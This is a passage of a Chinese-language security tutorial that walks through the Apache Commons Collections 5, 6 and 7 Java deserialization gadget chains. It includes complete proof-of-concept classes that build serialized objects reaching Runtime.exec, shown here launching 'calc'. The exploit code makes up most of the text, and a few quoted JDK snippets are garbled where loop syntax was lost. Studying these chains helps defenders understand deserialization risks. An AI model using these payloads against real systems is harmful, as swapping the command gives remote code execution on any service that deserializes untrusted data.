    import java.io.ObjectOutputStream;
    import java.lang.reflect.Field;
    import java.util.*;
    import java.util.Map;
    public class CommonsCollections5 {
        public static void main(String[] args) throws Exception {
            Transformer[] transformers=new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[]{}}),
                    new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[]{}}),
                    new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
            };
            ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);
            Map map=new HashMap();
            Map lazyMap=LazyMap.decorate(map,chainedTransformer);
            TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,"test");
            BadAttributeValueExpException badAttributeValueExpException=new BadAttributeValueExpException(null);
            Field field=badAttributeValueExpException.getClass().getDeclaredField("val");
            field.setAccessible(true);
            field.set(badAttributeValueExpException,tiedMapEntry);
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(new File("test.out")));
            objectOutputStream.writeObject(badAttributeValueExpException);
            objectOutputStream.close();
            ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("test.out"));
            objectInputStream.readObject();
        }
    }
需要注意的这里不能在`BadAttributeValueExpException`实例化的时候传入`entry`，而是通过反射赋值
    BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
    Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
    field.setAccessible(true);
    field.set(badAttributeValueExpException, entry);
因为如果是在实例化的时候传入`entry`，此时`this.val = val.toString()`就是一串字符串
    public String toString()  {
        return "BadAttributeValueException: " + val;
    }
    public BadAttributeValueExpException (Object val) {
        this.val = val == null ? null : val.toString();
    }
## CommonsCollections6
`CommonsCollections6`和5差不多，`ysoserial`中给出调用链如下：
    Gadget chain:
        java.io.ObjectInputStream.readObject()
            java.util.HashSet.readObject()
                java.util.HashMap.put()
                java.util.HashMap.hash()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
                        org.apache.commons.collections.map.LazyMap.get()
                            org.apache.commons.collections.functors.ChainedTransformer.transform()
                            org.apache.commons.collections.functors.InvokerTransformer.transform()
                            java.lang.reflect.Method.invoke()
                                java.lang.Runtime.exec()
`CommonsCollections6`和`CommonsCollections5`不同的是，6是将`BadAttributeValueExpException`换成了`HashSet`。
跟进`java.util.HashSet#readObject`
    private void readObject(java.io.ObjectInputStream s)
            throws java.io.IOException, ClassNotFoundException {
            //省略部分代码
            // Read in all elements in the proper order.
            for (int i=0; i>> 16);
    }
跟进`org.apache.commons.collections.keyvalue.TiedMapEntry#hashCode`
    public int hashCode() {
        Object value = this.getValue();
        return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode());
    }
跟进`org.apache.commons.collections.keyvalue.TiedMapEntry#getValue`，可以看到这里又调用了我们熟悉的`LazyMap.get`
    public Object getValue() {
        return this.map.get(this.key);
    }
POC如下：
    package CommonsCollections;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.keyvalue.TiedMapEntry;
    import org.apache.commons.collections.map.LazyMap;
    import java.io.FileInputStream;
    import java.io.FileOutputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Field;
    import java.util.HashMap;
    import java.util.HashSet;
    import java.util.Map;
    public class CommonsCollections6 {
        public static void main(String[] args) throws Exception {
            Transformer Testtransformer = new ChainedTransformer(new Transformer[]{});
            Transformer[] transformers=new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[]{}}),
                    new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[]{}}),
                    new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
            };
            Map map=new HashMap();
            Map lazyMap=LazyMap.decorate(map,Testtransformer);
            TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,"test1");
            HashSet hashSet=new HashSet(1);
            hashSet.add(tiedMapEntry);
            lazyMap.remove("test1");
            //通过反射覆盖原本的iTransformers，防止序列化时在本地执行命令
            Field field = ChainedTransformer.class.getDeclaredField("iTransformers");
            field.setAccessible(true);
            field.set(Testtransformer, transformers);
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("test.out"));
            objectOutputStream.writeObject(hashSet);
            objectOutputStream.close();
            ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("test.out"));
            objectInputStream.readObject();
        }
    }
另外还有一种利用方法是，在`java.util.HashMap#readObject`中直接调用`hash`，直接省去了前面`HashSet`调用的前几步，也就是说我们可以直接用`HashMap`即可，并不需要`HashSet`。
    private void readObject(java.io.ObjectInputStream s)
        throws IOException, ClassNotFoundException {
        //省略部分
            // Read the keys and values, and put the mappings in the HashMap
            for (int i = 0; i  0; elements--) {
                @SuppressWarnings("unchecked")
                    K key = (K)s.readObject();
                @SuppressWarnings("unchecked")
                    V value = (V)s.readObject();
                // sync is eliminated for performance
                reconstitutionPut(table, key, value);
            }
        }
跟进`java.util.Hashtable#reconstitutionPut`，此处put的时候通过`hashCode`和`equals`判断是否存在hash冲突
    private void reconstitutionPut(Entry[] tab, K key, V value)
        throws StreamCorruptedException
    {
        if (value == null) {
            throw new java.io.StreamCorruptedException();
        }
        // Makes sure the key is not already in the hashtable.
        // This should not happen in deserialized version.
        int hash = key.hashCode();
        int index = (hash & 0x7FFFFFFF) % tab.length;
        for (Entry e = tab[index] ; e != null ; e = e.next) {
            if ((e.hash == hash) && e.key.equals(key)) {
                throw new java.io.StreamCorruptedException();
            }
        }
        // Creates the new entry.
        @SuppressWarnings("unchecked")
            Entry e = (Entry)tab[index];
        tab[index] = new Entry<>(hash, key, value, e);
        count++;
    }
跟进`org.apache.commons.collections.map.AbstractMapDecorator#equals`
    public boolean equals(Object object) {
        return object == this ? true : this.map.equals(object);
    }
跟进`java.util.AbstractMap#equals`，可以看到此处又是`LazyMap.get`，之后又是一样的操作了
    public boolean equals(Object o) {
        if (o == this)
            return true;
        if (!(o instanceof Map))
            return false;
        Map m = (Map) o;
        if (m.size() != size())
            return false;
        try {
            Iterator> i = entrySet().iterator();
            while (i.hasNext()) {
                Entry e = i.next();
                K key = e.getKey();
                V value = e.getValue();
                if (value == null) {
                    if (!(m.get(key)==null && m.containsKey(key)))
                        return false;
                } else {
                    if (!value.equals(m.get(key)))
                        return false;
                }
            }
        } catch (ClassCastException unused) {
            return false;
        } catch (NullPointerException unused) {
            return false;
        }
        return true;
    }
POC如下：
    package CommonsCollections;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.LazyMap;
    import java.io.FileInputStream;
    import java.io.FileOutputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Field;
    import java.util.HashMap;
    import java.util.Hashtable;
    import java.util.Map;
    public class CommonsCollections7 {
        public static void main(String[] args) throws Exception{
            Transformer Testtransformer = new ChainedTransformer(new Transformer[]{});
            Transformer[] transformers=new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[]{}}),
                    new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[]{}}),
                    new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
            };
            Map map1=new HashMap();
            Map map2=new HashMap();
            Map lazyMap1= LazyMap.decorate(map1,Testtransformer);
            Map lazyMap2= LazyMap.decorate(map2,Testtransformer);
            lazyMap1.put("yy",1);
            lazyMap2.put("zZ",1);
            Hashtable hashtable = new Hashtable();
            hashtable.put(lazyMap1, 1);
            hashtable.put(lazyMap2, 2);
            lazyMap2.remove("yy");
            //通过反射覆盖原本的iTransformers，防止序列化时在本地执行命令
            Field field = ChainedTransformer.class.getDeclaredField("iTransformers");
            field.setAccessible(true);
            field.set(Testtransformer, transformers);
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("test.out"));
            outputStream.writeObject(hashtable);
            outputStream.close();
            ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream("test.out"));
            inputStream.readObject();
        }
    }
这里需要注意的是我们加了一行这个代码：`lazyMap2.remove("yy");`，因为`org.apache.commons.collections.map.LazyMap#get`的时候会进行put操作，所以此时会多出一个`yy`的元素，所以需要将其移除，否则无法正常反序列化
# 总结
貌似没啥好总结的感觉挺水的，`CommonsCollections1-7`的链调试一下`ysoserial`应该基本都能看懂.jpg
# Reference